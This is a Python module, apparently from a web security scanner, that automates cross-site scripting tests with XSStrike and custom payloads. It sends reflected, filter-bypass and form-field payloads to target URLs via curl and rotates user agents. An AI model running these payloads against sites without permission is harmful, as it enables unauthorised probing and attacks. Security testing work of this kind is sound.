#!/usr/bin/env python3
"""
XSS Testing Module
Orchestrates XSStrike for automated XSS vulnerability detection
"""

import asyncio
import json
import logging
import random
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .utils import RateLimiter, sanitize_filename

logger = logging.getLogger(__name__)


class XSSTester:
    """
    XSS testing using XSStrike and custom payload testing
    """
    
    def __init__(self, config):
        """
        Initialize XSS tester
        
        Args:
            config: Configuration manager instance
        """
        self.config = config
        delay = self.config.get('xss.delay', 1)
        # If delay is 0, rate is unlimited (infinite requests per second).
        # Otherwise, requests_per_second is 1/delay.
        requests_per_second = float('inf') if delay <= 0 else 1.0 / delay
        self.rate_limiter = RateLimiter(
            requests_per_second=requests_per_second
        )
        self.owasp_category = "A03:2021 – Injection"
        self.xss_payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<svg onload=alert("XSS")>',
                '<img src=x onerror=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '"><script>alert("XSS")</script>',
                '\';alert("XSS");//'
            ],
            'advanced': [
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<svg/onload=alert(/XSS/)>',
                '<img/src/onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                '<script>setTimeout("alert(\'XSS\')",100)</script>',
                '<body onload=alert("XSS")>',
                '<div onmouseover=alert("XSS")>test</div>',
                '<marquee onstart=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>'
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(/XSS/)</script>',
                '<script>alert`XSS`</script>',
                '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
                '<img src="javascript:alert(\'XSS\')" />',
                '<svg><script>alert("XSS")</script></svg>',
                '<%00script>alert("XSS")</%00script>',
                '<script>&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;</script>',
                '<script>al\x65rt("XSS")</script>',
                '<script>window["ale"+"rt"]("XSS")</script>'
            ]
        }
        self.context_payloads = {
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '\' onmouseover=\'alert("XSS")\'',
                '"><script>alert("XSS")</script>',
                '\';alert("XSS");//'
            ],
            'javascript': [
                '\';alert("XSS");//',
                '\";alert("XSS");//',
                '</script><script>alert("XSS")</script>',
                '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e'
            ],
            'url': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:msgbox("XSS")'
            ]
        }
    
    async def test_targets(self, targets: List, progress=None, task_id=None) -> List[Dict]:
        """
        Test multiple targets for XSS vulnerabilities
        """
        results = []
        total_targets = len(targets)
        
        logger.info(f"Starting XSS testing on {total_targets} targets")
        
        for i, target in enumerate(targets):
            try:
                await self.rate_limiter.wait_if_needed()
                
                if progress and task_id:
                    progress.update(task_id, advance=1,
                                  description=f"Testing target {i+1}/{total_targets}")
                
                result = await self._test_single_target(target)
                results.append(result)
                
                if result.get('vulnerable', False):
                    logger.warning(f"XSS vulnerability found: {result['url']}")
                
            except Exception as e:
                logger.error(f"Error testing target {target}: {str(e)}")
                results.append({
                    'url': str(target),
                    'vulnerable': False,
                    'error': str(e),
                    'timestamp': self._get_timestamp()
                })
        
        logger.info(f"XSS testing completed. Found {len([r for r in results if r.get('vulnerable', False)])} vulnerabilities")
        
        return results
    
    async def _test_single_target(self, target) -> Dict:
        """
        Test a single target for XSS vulnerabilities
        """
        # Check if this is a form (has action key)
        if isinstance(target, dict) and 'action' in target:
            return await self._test_form_xss(target)
        
        # Existing URL testing code
        if isinstance(target, dict):
            url = target['url']
            interesting_params = target.get('xss_params', [])
        else:
            url = str(target)
            interesting_params = []
        
        logger.debug(f"Testing XSS on: {url}")
        
        result = {
            'url': url,
            'vulnerable': False,
            'vulnerability_type': None,
            'vulnerable_parameters': [],
            'payloads': [],
            'contexts': [],
            'severity': 'info',
            'owasp_category': self.owasp_category,
            'timestamp': self._get_timestamp(),
            'tool': 'custom_xss_tester'
        }
        
        try:
            if interesting_params:
                quick_result = await self._quick_xss_test(url, interesting_params)
                if quick_result['vulnerable']:
                    result.update(quick_result)
                    result['severity'] = 'high'
                    return result
            
            xsstrike_result = await self._run_xsstrike(url)
            if xsstrike_result['vulnerable']:
                result.update(xsstrike_result)
                result['severity'] = self._determine_severity(xsstrike_result)
                return result
            
            custom_result = await self._custom_xss_test(url)
            if custom_result['vulnerable']:
                result.update(custom_result)
                result['severity'] = self._determine_severity(custom_result)
        
        except Exception as e:
            logger.error(f"Error in XSS testing for {url}: {str(e)}")
            result['error'] = str(e)
        
        return result
    
    async def _quick_xss_test(self, url: str, params: List[str]) -> Dict:
        """
        Quick XSS test on specific parameters
        """
        result = {
            'vulnerable': False,
            'vulnerability_type': 'reflected_xss',
            'vulnerable_parameters': [],
            'payloads': [],
            'method': 'parameter_injection'
        }
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param in params:
            if param in query_params:
                for payload in self.xss_payloads['basic'][:3]:
                    test_result = await self._test_parameter_xss(url, param, payload)
                    
                    if test_result['vulnerable']:
                        result['vulnerable'] = True
                        result['vulnerable_parameters'].append(param)
                        result['payloads'].append({
                            'parameter': param,
                            'payload': payload,
                            'context': test_result.get('context', 'unknown'),
                            'evidence': test_result.get('evidence', [])
                        })
        
        return result
    
    async def _test_parameter_xss(self, url: str, param: str, payload: str) -> Dict:
        """
        Test a specific parameter with an XSS payload
        """
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = [payload]
            
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, new_query, parsed_url.fragment
            ))
            
            user_agent = random.choice(self.config.get('general.user_agents', ['XSS-Scanner']))
            cmd = ['curl', '-s', '-L', '--max-time', '10', '--user-agent', user_agent, test_url]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            response = stdout.decode(errors='ignore')
            
            evidence = []
            context = 'unknown'
            
            vulnerable = False
            if payload in response:
                evidence.append('payload_reflected')
                vulnerable = True # The vulnerability is confirmed by reflection alone.

                # Determine context (this part is for better reporting, not detection)
                if f'<script>{payload}</script>' in response:
                    context = 'html_body'
                elif f'"{payload}"' in response or f"'{payload}'" in response:
                    context = 'attribute'
                elif f'>{payload}<' in response:
                    context = 'html_content'
                else:
                    context = 'unknown_reflection'

                # (Optional but good) You could still look for indicators for more info,
                # but the primary detection is the reflection itself.
                js_indicators = ['alert(', 'confirm(', 'prompt(', 'console.log(']
                for indicator in js_indicators:
                    if indicator in response:
                        evidence.append(f'js_indicator_{indicator.replace("(", "")}_found')


            return {
                'vulnerable': vulnerable,
                'evidence': evidence,
                'context': context,
                'response_length': len(response)
            }
        
        except Exception as e:
            logger.debug(f"Error testing XSS on parameter {param}: {str(e)}")
            return {'vulnerable': False}
    
    async def _run_xsstrike(self, url: str) -> Dict:
        """
        Run XSStrike against the target URL
        """
        result = { 'vulnerable': False }
        
        try:
            cmd = [
                'xsstrike', '-u', url,
                '--crawl',
                '--timeout', str(self.config.get('xss.timeout', 20)),
                '--payload-level', str(self.config.get('xss.payload_level', 6))
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=self.config.get('xss.timeout', 60)
            )
            
            output = stdout.decode() + stderr.decode()
            result = self._parse_xsstrike_output(output, url)
            
        except FileNotFoundError:
            logger.debug("XSStrike not found. Skipping.")
        except Exception as e:
            logger.debug(f"XSStrike failed: {str(e)}")
        
        return result
    
    def _parse_xsstrike_output(self, output: str, url: str) -> Dict:
        """
        Parse XSStrike output
        """
        result = {
            'vulnerable': False,
            'vulnerability_type': 'xsstrike',
            'vulnerable_parameters': [],
            'payloads': [],
            'contexts': [],
            'raw_output': output
        }
        
        vuln_indicators = [
            'Potentially vulnerable',
            'XSS detected',
            'Vulnerable parameter',
            'Payload worked'
        ]
        
        if any(indicator.lower() in output.lower() for indicator in vuln_indicators):
            result['vulnerable'] = True
        
        param_pattern = r'Parameter:\s*([^\s]+)'
        params = re.findall(param_pattern, output, re.IGNORECASE)
        if params:
            result['vulnerable_parameters'] = list(set(params))
        
        payload_pattern = r'Payload:\s*(.+?)(?:\n|$)'
        payloads = re.findall(payload_pattern, output, re.IGNORECASE)
        if payloads:
            result['payloads'] = [{'payload': p.strip(), 'source': 'XSStrike'} for p in payloads]
        
        return result
    
    async def _custom_xss_test(self, url: str) -> Dict:
        """
        Custom XSS testing when XSStrike is not available
        """
        result = {
            'vulnerable': False,
            'vulnerability_type': 'custom_xss',
            'vulnerable_parameters': [],
            'payloads': [],
            'contexts': [],
            'method': 'comprehensive_testing'
        }
        
        parsed_url = urlparse(url)
        
        if parsed_url.query:
            query_params = parse_qs(parsed_url.query)
            
            for param_name in query_params.keys():
                param_result = await self._test_parameter_comprehensive(url, param_name)
                
                if param_result['vulnerable']:
                    result['vulnerable'] = True
                    result['vulnerable_parameters'].append(param_name)
                    result['payloads'].extend(param_result['payloads'])
                    result['contexts'].extend(param_result['contexts'])
        
        if not self.config.get('xss.skip_dom', True):
            dom_result = await self._test_dom_xss(url)
            if dom_result['vulnerable']:
                result['vulnerable'] = True
                result['vulnerability_type'] = 'dom_xss'
                result['payloads'].extend(dom_result['payloads'])
        
        return result
    
    async def _test_parameter_comprehensive(self, url: str, param_name: str) -> Dict:
        """
        Comprehensive testing of a single parameter
        """
        result = { 'vulnerable': False, 'payloads': [], 'contexts': [] }
        
        for category, payloads in self.xss_payloads.items():
            for payload in payloads[:2]:
                test_result = await self._test_parameter_xss(url, param_name, payload)
                
                if test_result['vulnerable']:
                    result['vulnerable'] = True
                    result['payloads'].append({
                        'parameter': param_name,
                        'payload': payload,
                        'category': category,
                        'context': test_result.get('context', 'unknown'),
                        'evidence': test_result.get('evidence', [])
                    })
                    result['contexts'].append(test_result.get('context', 'unknown'))
                
                await asyncio.sleep(0.5)
        
        return result
    
    async def _test_dom_xss(self, url: str) -> Dict:
        """
        Test for DOM-based XSS vulnerabilities
        """
        result = { 'vulnerable': False, 'payloads': [], 'method': 'dom_analysis' }
        
        try:
            user_agent = random.choice(self.config.get('general.user_agents', ['DOM-XSS-Scanner']))
            cmd = ['curl', '-s', '-L', '--max-time', '10', '--user-agent', user_agent, url]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            content = stdout.decode(errors='ignore')
            
            dom_sinks = [
                'document.write', 'innerHTML', 'outerHTML', 'document.writeln',
                'eval(', 'setTimeout(', 'setInterval(',
                'location.href', 'location.replace', 'location.assign'
            ]
            dom_sources = [
                'location.search', 'location.hash', 'location.href',
                'document.referrer', 'window.name', 'document.cookie'
            ]
            
            found_sinks = [sink for sink in dom_sinks if sink in content]
            found_sources = [source for source in dom_sources if source in content]
            
            if found_sinks and found_sources:
                result['vulnerable'] = True
                result['payloads'].append({
                    'type': 'dom_xss_indicators',
                    'sinks': found_sinks,
                    'sources': found_sources,
                    'payload': '#<script>alert("DOM-XSS")</script>'
                })
        
        except Exception as e:
            logger.debug(f"DOM XSS testing failed: {str(e)}")
        
        return result
    
    def _determine_severity(self, test_result: Dict) -> str:
        """
        Determine severity level based on test results
        """
        if not test_result.get('vulnerable', False):
            return 'info'
        
        critical_factors = [
            'dom_xss' in test_result.get('vulnerability_type', ''),
            any('cookie' in str(payload).lower() for payload in test_result.get('payloads', [])),
            any('document.write' in str(payload) for payload in test_result.get('payloads', []))
        ]
        
        high_factors = [
            len(test_result.get('vulnerable_parameters', [])) > 2,
            'html_body' in test_result.get('contexts', []),
            any('script' in str(payload) for payload in test_result.get('payloads', []))
        ]
        
        medium_factors = [
            'attribute' in test_result.get('contexts', []),
            len(test_result.get('payloads', [])) > 1
        ]
        
        if any(critical_factors):
            return 'critical'
        elif any(high_factors):
            return 'high'
        elif any(medium_factors):
            return 'medium'
        else:
            return 'low'
    
    def _get_timestamp(self) -> str:
        """Get current timestamp in ISO format"""
        from datetime import datetime
        return datetime.now().isoformat()

    async def _test_form_xss(self, form_info: Dict) -> Dict:
        """
        Test a form for XSS vulnerabilities
        
        Args:
            form_info: Form information dictionary
            
        Returns:
            Test result dictionary
        """
        result = {
            'url': form_info['action'],
            'vulnerable': False,
            'vulnerability_type': None,
            'vulnerable_parameters': [],
            'payloads': [],
            'contexts': [],
            'severity': 'info',
            'owasp_category': self.owasp_category,
            'timestamp': self._get_timestamp(),
            'tool': 'custom_form_tester',
            'method': form_info.get('method', 'GET')
        }
        
        try:
            # Test each input field
            for input_field in form_info.get('inputs', []):
                field_name = input_field.get('name')
                if not field_name:
                    continue
                    
                # Test with basic payloads
                for payload in self.xss_payloads['basic'][:3]:
                    test_result = await self._test_form_field_xss(
                        form_info['action'], 
                        form_info.get('method', 'POST'),
                        form_info.get('inputs', []),
                        field_name,
                        payload
                    )
                    
                    if test_result['vulnerable']:
                        result['vulnerable'] = True
                        result['vulnerable_parameters'].append(field_name)
                        result['payloads'].append({
                            'parameter': field_name,
                            'payload': payload,
                            'context': test_result.get('context', 'unknown'),
                            'evidence': test_result.get('evidence', [])
                        })
                        result['severity'] = 'high'
            
        except Exception as e:
            logger.error(f"Error testing form {form_info['action']}: {str(e)}")
            result['error'] = str(e)
        
        return result

    async def _test_form_field_xss(self, action: str, method: str, inputs: List[Dict], 
                                field_name: str, payload: str) -> Dict:
        """
        Test a specific form field with an XSS payload
        
        Args:
            action: Form action URL
            method: HTTP method (GET/POST)
            inputs: List of form inputs
            field_name: Field name to test
            payload: XSS payload
            
        Returns:
            Test result
        """
        try:
            # Prepare form data
            form_data = {}
            for input_field in inputs:
                name = input_field.get('name')
                if name:
                    # Use payload for the target field, default values for others
                    form_data[name] = payload if name == field_name else input_field.get('value', '')
            
            # Build curl command
            cmd = ['curl', '-s', '-L', '--max-time', '10']
            
            if method.upper() == 'POST':
                cmd.extend(['-X', 'POST'])
                # URL-encode form data
                form_data_str = '&'.join([f"{k}={v}" for k, v in form_data.items()])
                cmd.extend(['-d', form_data_str])
            else:
                # For GET, append to URL
                action += '?' + '&'.join([f"{k}={v}" for k, v in form_data.items()])
            
            cmd.extend(['--user-agent', random.choice(self.config.get('general.user_agents', ['XSS-Scanner']))])
            cmd.append(action)
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            response = stdout.decode(errors='ignore')
            
            evidence = []
            context = 'unknown'
            
            # Check if payload is reflected
            vulnerable = payload in response
            
            if vulnerable:
                # Determine context
                if f'<script>{payload}</script>' in response:
                    context = 'html_body'
                elif f'"{payload}"' in response or f"'{payload}'" in response:
                    context = 'attribute'
                elif f'>{payload}<' in response:
                    context = 'html_content'
                else:
                    context = 'unknown_reflection'
                
                # Check for JavaScript execution indicators
                js_indicators = ['alert(', 'confirm(', 'prompt(', 'console.log(']
                for indicator in js_indicators:
                    if indicator in response:
                        evidence.append(f'js_indicator_{indicator.replace("(", "")}_found')
            
            return {
                'vulnerable': vulnerable,
                'evidence': evidence,
                'context': context,
                'response_length': len(response)
            }
        
        except Exception as e:
            logger.debug(f"Error testing form field {field_name}: {str(e)}")
            return {'vulnerable': False}